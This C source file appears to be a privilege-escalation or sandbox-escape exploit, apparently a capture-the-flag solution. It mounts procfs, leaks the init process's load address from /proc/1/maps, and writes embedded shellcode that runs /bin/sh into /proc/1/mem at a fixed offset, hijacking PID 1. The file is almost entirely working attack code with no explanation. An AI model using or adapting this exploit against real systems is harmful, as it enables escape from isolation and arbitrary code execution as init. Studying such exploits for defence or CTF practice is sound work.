#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>
#include <fcntl.h>
#include <dirent.h>
#include <syscall.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/mount.h>

int main()
{

    int sfd, mfd, fd;
    char buf[0x100];
    size_t image_addr = 0;
    unsigned char shellcode[] = {
        0x48, 0x8d, 0x3d, 0x17, 0x00, 0x00, 0x00, 0x48, 0x89, 0x3c, 0x24, 0x48,
        0xc7, 0x44, 0x24, 0x08, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xe6, 0xb8,
        0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
        0x68, 0x00
    };


    // Mount procfs
    sfd = syscall(SYS_fsopen, "proc", FSOPEN_CLOEXEC);
    syscall(SYS_fsconfig, sfd, FSCONFIG_SET_STRING, "source", "proc", 0);
    syscall(SYS_fsconfig, sfd, FSCONFIG_CMD_CREATE, NULL, NULL, 0);
    mfd = syscall(SYS_fsmount, sfd, 0, 0, 0, 0);
    mkdir("/proc", 755);
    syscall(SYS_move_mount, mfd, "", AT_FDCWD, "/proc", MOVE_MOUNT_F_EMPTY_PATH);

    // Leak address
    fd = open("/proc/1/maps", O_RDONLY);
    read(fd, buf, sizeof(buf));
    image_addr = 0;
    for(int i = 0; buf[i] != '-'; i++)
    {
        if(buf[i] >= '0' && buf[i] <= '9')
        {
            image_addr = image_addr * 0x10 + (buf[i] - '0');
        }
        if(buf[i] >= 'a' && buf[i] <= 'f')
        {
            image_addr = image_addr * 0x10 + (buf[i] - 'a' + 0xa);
        }
    }
    printf("Image addr: 0x%lx\n", image_addr);

    // Hijack init process
    fd = open("/proc/1/mem", O_RDWR);
    lseek(fd, image_addr + 0x3c28e, SEEK_SET);
    write(fd, shellcode, sizeof(shellcode));

    return 0;
}
